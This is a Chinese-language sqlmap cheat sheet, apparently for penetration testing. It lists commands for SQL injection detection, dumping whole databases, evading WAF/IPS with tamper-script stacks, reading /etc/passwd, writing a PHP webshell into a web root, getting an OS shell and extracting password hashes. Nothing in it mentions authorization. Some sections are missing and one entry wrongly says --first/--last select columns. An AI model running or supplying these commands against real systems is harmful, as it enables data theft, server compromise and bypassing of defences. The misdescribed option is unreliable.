# sqlmap 常用命令速查表

> 本速查表整理了 sqlmap 最常用的命令和参数，方便快速查阅。

---

## 一、基础命令

### 1.1 指定目标

| 命令 | 说明 |
|------|------|
| `sqlmap -u "http://target.com/page?id=1"` | 扫描单个 URL |
| `sqlmap -r request.txt` | 从文件加载 HTTP 请求（Burp 导出） |
| `sqlmap -m urls.txt` | 从文件批量扫描 URL |
| `sqlmap -l burp.log` | 从 Burp log 文件加载 |
| `sqlmap -g "inurl:php?id="` | Google dork 搜索目标 |
| `sqlmap -c config.ini` | 从配置文件加载参数 |

### 1.2 指定参数

| 命令 | 说明 |
|------|------|
| `--data="id=1&cat=2"` | POST 数据 |
| `-p "id"` | 指定测试参数 |
| `--skip="cat,page"` | 跳过指定参数 |
| `--cookie="id=1; sess=abc"` | Cookie |
| `--user-agent="Mozilla/5.0..."` | 自定义 User-Agent |
| `--random-agent` | 随机 User-Agent |
| `--referer="http://target.com"` | 自定义 Referer |
| `--headers="X-Forwarded-For: *"` | 自定义 Header |
| `--method=POST` | 指定 HTTP 方法 |

### 1.3 测试等级与风险

| 命令 | 说明 |
|------|------|
| `--level=1` | 等级 1（默认，仅 GET/POST） |
| `--level=2` | 等级 2（含 Cookie） |
| `--level=3` | 等级 3（含 UA/Referer） |
| `--level=4` | 等级 4（更多 Header） |
| `--level=5` | 等级 5（全部） |
| `--risk=1` | 风险 1（安全，默认） |
| `--risk=2` | 风险 2（含时间盲注） |
| `--risk=3` | 风险 3（含 OR/堆叠，可能破坏数据） |

**常用组合：**
```bash
# 深度扫描
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# 中等深度（推荐）
sqlmap -u "http://target.com/page?id=1" --level=3 --risk=2
```

## 二、注入技术

### 2.1 指定注入类型

| 参数 | 类型 | 说明 |
|------|------|------|
| `--technique=B` | Boolean-based blind | 布尔盲注 |
| `--technique=E` | Error-based | 报错注入 |
| `--technique=U` | UNION query | 联合查询 |
| `--technique=S` | Stacked queries | 堆叠注入 |
| `--technique=T` | Time-based blind | 时间盲注 |
| `--technique=Q` | Inline queries | 内联查询 |

**常用组合：**
```bash
# 使用所有技术（默认 BEUSTQ）
sqlmap -u "..." --technique=BEUSTQ

# 只使用联合查询（最快）
sqlmap -u "..." --technique=U

# 只使用时间盲注
sqlmap -u "..." --technique=T

# 联合查询 + 报错注入
sqlmap -u "..." --technique=UE
```

### 2.2 指定数据库

| 命令 | 说明 |
|------|------|
| `--dbms=mysql` | MySQL |
| `--dbms=mssql` | Microsoft SQL Server |
| `--dbms=oracle` | Oracle |
| `--dbms=postgresql` | PostgreSQL |
| `--dbms=access` | Microsoft Access |
| `--dbms=sqlite` | SQLite |
| `--dbms=mongodb` | MongoDB |
| `--dbms=db2` | IBM DB2 |
| `--dbms=firebird` | Firebird |
| `--dbms=sybase` | Sybase |

### 2.3 前缀和后缀

```bash
# 前缀（闭合前面的语法）
sqlmap -u "..." --prefix="')"

# 后缀（注释掉后面的语法）
sqlmap -u "..." --suffix="-- "

# 组合使用
sqlmap -u "..." --prefix="')" --suffix=" AND ('1'='1"

# 生成的 Payload 示例：
# 1') UNION SELECT 1,2,3 AND ('1'='1
```

## 三、枚举数据

### 3.1 基本信息

| 命令 | 说明 |
|------|------|
| `-b` / `--banner` | 数据库版本/ banner |
| `--current-db` | 当前数据库名 |

| `--dbs` | 所有数据库 |
| `--users` | 所有用户 |

| `--privileges` | 所有权限 |
| `--roles` | 所有角色 |
| `--hostname` | 主机名 |

### 3.2 表和列

| 命令 | 说明 |
|------|------|
| `-D dbname --tables` | 指定数据库的所有表 |
| `--tables` | 所有数据库的所有表 |
| `-D dbname -T tablename --columns` | 指定表的所有列 |
| `-D dbname --columns` | 指定库所有表的所有列 |
| `-D dbname -T table -C col1,col2 --dump` | 导出指定列数据 |
| `--schema` | 数据库 schema（表和列） |
| `--count` | 统计表行数 |

### 3.3 导出数据

| 命令 | 说明 |
|------|------|
| `-D db -T table --dump` | 导出单表数据 |
| `-D db --dump` | 导出整个数据库 |

| `--first=1 --last=5` | 只导出第 1-5 列 |

### 3.4 搜索

| 命令 | 说明 |
|------|------|
| `--search -T user` | 搜索包含 'user' 的表 |

## 五、绕过 WAF/IPS

```bash
sqlmap --list-tampers
```

**常用 tamper 分类：**

| 分类 | 脚本 | 说明 |
|------|------|------|
| **空格替换** | `space2comment` | 空格 → `/**/` |
| | `space2dash` | 空格 → `--`+换行 |
| | `space2hash` | 空格 → `#`+换行 |
| | `space2plus` | 空格 → `+` |
| | `space2morehash` | 空格 → `#`+更多 |
| | `space2randomblank` | 空格 → 随机空白 |
| **关键字绕过** | `randomcase` | 随机大小写 |
| | `randomcomments` | 随机插入注释 |
| | `charunicodeencode` | Unicode 编码 |
| | `charencode` | URL 全编码 |
| | `chardoubleencode` | 双重 URL 编码 |
| | `versionedkeywords` | MySQL 版本注释 |
| | `halfversionedmorekeywords` | 半版本注释 |
| **符号替换** | `between` | `>` → `BETWEEN` |
| | `greatest` | `>` → `GREATEST` |
| | `equaltolike` | `=` → `LIKE` |
| | `ifnull2ifisnull` | `IFNULL` → `IF IS NULL` |
| | `symboliclogical` | AND/OR → 符号 |
| | `plus2concat` | `+` → `CONCAT` |
| **逗号绕过** | `commalesslimit` | LIMIT 逗号绕过 |
| | `commalessmid` | MID 函数逗号绕过 |
| **引号绕过** | `apostrophemask` | 单引号 UTF-8 编码 |
| | `apostrophenullencode` | 单引号 `%00%27` |
| | `unmagicquotes` | 宽字节注入 |
| | `escapequotes` | 反斜杠转义 |
| **其他** | `base64encode` | Base64 编码 |
| | `htmlencode` | HTML 编码 |
| | `hex2char` | 十六进制转字符 |
| | `percentage` | 字符前加 `%` |
| | `nonrecursivereplacement` | 双写绕过 |
| | `xforwardedfor` | 添加 X-Forwarded-For 头 |
| | `bluecoat` | Blue Coat 绕过 |
| | `modsecurityversioned` | ModSecurity 绕过 |
| | `securesphere` | Securesphere 绕过 |
| | `sp_password` | MSSQL 日志绕过 |

### 5.2 常用 tamper 组合

```bash
# 通用组合（推荐先试）
sqlmap -u "..." --tamper=space2comment,randomcase,charencode

# MySQL 专用
sqlmap -u "..." --tamper=space2comment,versionedmorekeywords,between,greatest

# 强 WAF 组合
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage

# ModSecurity WAF
sqlmap -u "..." --tamper=space2comment,modsecurityversioned,modsecurityzeroversioned,randomcase

# 双写绕过（替换型 WAF）
sqlmap -u "..." --tamper=nonrecursivereplacement,space2comment

# 宽字节注入
sqlmap -u "..." --tamper=unmagicquotes
```

## 七、常用扫描组合速查

### 7.1 检测阶段

```bash
# 1. 基础检测（GET 参数）
sqlmap -u "http://target.com/page?id=1" --batch

# 2. POST 请求检测
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 3. 从 Burp 请求文件检测（推荐）
sqlmap -r request.txt --batch

# 4. 深度检测（高 level/risk）
sqlmap -u "..." --level=5 --risk=3 --batch

# 5. 指定数据库类型（加速检测）
sqlmap -u "..." --dbms=mysql --batch

# 6. Cookie 注入
sqlmap -u "..." --cookie="id=1" --level=2 --batch

# 7. Header 注入
sqlmap -u "..." --user-agent="*" --level=3 --batch
sqlmap -u "..." --referer="*" --level=3 --batch
sqlmap -u "..." --headers="X-Forwarded-For: *" --level=3 --batch
```

### 7.2 枚举阶段

```bash
# 1. 获取基本信息
sqlmap -u "..." -b --batch

# 2. 获取所有数据库
sqlmap -u "..." --dbs --batch

# 3. 获取指定库的表
sqlmap -u "..." -D dbname --tables --batch

# 4. 获取指定表的列
sqlmap -u "..." -D dbname -T tablename --columns --batch

# 5. 导出表数据
sqlmap -u "..." -D dbname -T tablename --dump --batch

# 6. 导出整个数据库
sqlmap -u "..." -D dbname --dump --batch

# 7. 搜索特定表/列
sqlmap -u "..." -D dbname --search -T user --batch
sqlmap -u "..." -D dbname --search -C pass --batch
```

### 7.3 利用阶段

```bash
# 1. 读取文件
sqlmap -u "..." --file-read="/etc/passwd" --batch

# 2. 写入 WebShell
sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# 3. 获取 OS Shell
sqlmap -u "..." --os-shell --batch

# 4. 执行单条命令
sqlmap -u "..." --os-cmd="whoami" --batch

# 5. 获取所有密码哈希
sqlmap -u "..." --passwords --batch
```

### 7.4 WAF 绕过阶段

```bash
# 1. 基础绕过
sqlmap -u "..." --tamper=space2comment,randomcase --random-agent --batch

# 2. 中级绕过
sqlmap -u "..." --tamper=space2comment,randomcase,charencode --delay=0.5 --batch

# 3. 高级绕过
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,between --delay=1 --batch

# 4. 代理 + 绕过
sqlmap -u "..." --proxy=http://127.0.0.1:8080 --tamper=space2comment,randomcase --batch

# 5. 慢速 + 多 tamper（最强绕过）
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,charunicodeencode,between,greatest,percentage --delay=2 --threads=1 --batch
```

## 八、特殊场景速查

### 8.1 伪静态/RESTful URL

```bash
# 在 URL 路径中标记注入点（用 *）
sqlmap -u "http://target.com/article/1*.html"
sqlmap -u "http://target.com/news/1*/category/2*.html"
sqlmap -u "http://target.com/api/v1/users/1*"
sqlmap -u "http://target.com/page/100*/detail"
```

### 8.2 JSON 数据注入

```bash
# JSON POST 数据
sqlmap -u "http://target.com/api" \
       --data='{"username":"admin","password":"123"}' \
       --method=POST

# 标记 JSON 中的注入点
sqlmap -u "http://target.com/api" \
       --data='{"id":1*,"name":"test"}' \
       --method=POST
```

### 8.3 二次注入

```bash
# 注入 URL + 查看结果 URL
sqlmap -u "http://target.com/add_user.php" \
       --data="username=test*&password=123" \
       --second-url="http://target.com/user_info.php" \
       -p username
```

### 8.4 批量扫描

```bash
# 从文件批量扫描 URL
sqlmap -m urls.txt --batch

# 从 Burp log 批量扫描
sqlmap -l burp.log --batch

# 爬虫 + 扫描
sqlmap -u "http://target.com" --crawl=2 --batch
```

## 九、命令速查卡片

```
基础检测:
  sqlmap -u <URL>                    # GET 参数
  sqlmap -u <URL> --data=<POST>      # POST 参数
  sqlmap -r <文件>                   # 从请求文件
  sqlmap -u <URL> --level=5 --risk=3 # 深度检测

枚举数据:
  sqlmap -u <URL> --dbs              # 所有数据库
  sqlmap -u <URL> -D <库> --tables   # 所有表
  sqlmap -u <URL> -D <库> -T <表> --columns  # 所有列
  sqlmap -u <URL> -D <库> -T <表> --dump     # 导出数据

命令执行:
  sqlmap -u <URL> --os-shell         # 交互式 Shell
  sqlmap -u <URL> --os-cmd=<命令>    # 执行单条命令
  sqlmap -u <URL> --file-read=<路径> # 读取文件
  sqlmap -u <URL> --file-write=<本地> --file-dest=<远程>  # 写入文件

绕过 WAF:
  sqlmap -u <URL> --tamper=space2comment,randomcase
  sqlmap -u <URL> --tamper=space2comment,randomcase,charencode
  sqlmap -u <URL> --random-agent --delay=1
  sqlmap -u <URL> --proxy=http://127.0.0.1:8080

其他:
  sqlmap -u <URL> --batch            # 非交互模式
  sqlmap -u <URL> -v 3               # 显示 Payload
  sqlmap -u <URL> --threads=10       # 多线程
  sqlmap -u <URL> --dbms=mysql       # 指定数据库
  sqlmap -u <URL> --technique=U      # 指定注入类型
```
